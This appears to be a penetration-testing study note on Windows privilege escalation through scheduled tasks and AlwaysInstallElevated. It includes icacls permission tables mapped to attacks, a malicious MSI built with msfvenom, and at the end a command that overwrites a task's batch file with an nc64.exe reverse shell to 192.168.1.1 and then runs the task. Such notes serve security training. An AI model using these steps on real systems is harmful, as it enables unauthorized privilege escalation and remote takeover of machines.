# Scheduled Tasks
 
- Misconfigured Task: A scheduled task may run a binary you can modify. You can list tasks with schtasks /query and check the file permissions using icacls.
- Privilege Escalation: If a scheduled task’s executable is accessible, modify it to execute a reverse shell. For example, replace the task’s binary with a command to spawn a reverse shell using nc64.exe.
- Triggering the Task: Once the task is modified, use schtasks /run to manually execute it and get a reverse shell with the user privileges of the scheduled task


## AlwaysInstallElevated:

- Windows Installer: MSI files can be set to run with elevated privileges if registry keys are configured. This allows unprivileged users to run an MSI that executes with administrator rights.
- Registry Check: Use reg query to check if the necessary registry keys are set. If they are, generate a malicious MSI file using msfvenom and execute it with msiexec to get a reverse shell.

Both methods demonstrate how improper configurations can lead to privilege escalation by exploiting the ability to modify files or settings that execute with higher privileges.

Getting info about the services

```
schtasks /query /tn vulntask /fo list /v
```

Check the `Task to Run` Permission
```
icacls c:\tasks\schtask.bat
```

### Basic Permissions


| Flag   | Name           | Meaning                                                              |
| ------ | -------------- | -------------------------------------------------------------------- |
| **F**  | Full Control   | Full access (read, write, execute, delete, change ACL, change owner) |
| **M**  | Modify         | Read + Write + Execute + Delete                                      |
| **RX** | Read & Execute | Read and run files                                                   |
| **R**  | Read           | Read file contents                                                   |
| **W**  | Write          | Write or create files                                                |
| **D**  | Delete         | Delete files or folders                                              |


### Notes

> M or F on a service binary → Privilege Escalation candidate
> W on a service directory → DLL hijacking / binary replacement

### Advanced Permissions
These usually appear inside parentheses ().

| Flag     | Name                      | Technical Meaning                    |
| -------- | ------------------------- | ------------------------------------ |
| **RD**   | Read Data                 | Read file data                       |
| **WD**   | Write Data                | Write/overwrite data                 |
| **AD**   | Append Data               | Append data without overwrite        |
| **REA**  | Read Extended Attributes  | Read extended attributes             |
| **WEA**  | Write Extended Attributes | Write extended attributes            |
| **X**    | Execute                   | Execute the file                     |
| **DC**   | Delete Child              | Delete files inside a directory      |
| **RA**   | Read Attributes           | Read file attributes                 |
| **WA**   | Write Attributes          | Modify file attributes               |
| **DE**   | Delete                    | Delete the object                    |
| **RC**   | Read Control              | Read ACL                             |
| **WDAC** | Write DAC                 | Modify ACLs (**🔥 critical**)        |
| **WO**   | Write Owner               | Change ownership (**🔥 critical**)   |
| **S**    | Synchronize               | Synchronization (default permission) |


### Inheritance Flags (Very Important)


| Flag     | Meaning                        |
| -------- | ------------------------------ |
| **(OI)** | Object Inherit (files)         |
| **(CI)** | Container Inherit (folders)    |
| **(IO)** | Inherit Only                   |
| **(NP)** | No Propagate                   |
| **(I)**  | Inherited (not explicitly set) |


```
BUILTIN\Users:(OI)(CI)(RX)
```
Meaning:
> Users can read & execute all files and subfolders inside the directory.	



```cmd
C:\Program Files\App\app.exe
  BUILTIN\Users:(M)
```
Meaning:
> All users can modify the executable → Service Binary Hijacking



```cmd
C:\Program Files\App\
  Everyone:(OI)(CI)(W)
```
Meaning:
> Writable directory → DLL search order hijacking



| Permission Found | Possible Attack            |
| ---------------- | -------------------------- |
| W / M on `.exe`  | Service binary replacement |
| W on directory   | DLL hijacking              |
| WDAC             | ACL abuse                  |
| WO               | Ownership takeover         |
| F                | Full compromise            |


Recursive Check
```cmd
icacls C:\path /T
```

Quick filter
```
icacls C:\path | findstr "(M) (F) WDAC WO"
```

Example
```
C:\Program Files\App\app.exe
  BUILTIN\Users:(M)
  NT AUTHORITY\SYSTEM:(I)(F)
  BUILTIN\Administrator:(I)(F)
  
Successfully processed 1 files; Failed processed 0 files
```

since it has (F) Full control Permission, We can do overwrite to the `Task to run`
```
echo c:\tools\nc64.exe -e cmd.exe 192.168.1.1 4444 > C:\tasks\schtask.bat
```

> Change to ur payload

Run the tasks
```
schtasks /run /tn vulntask
```





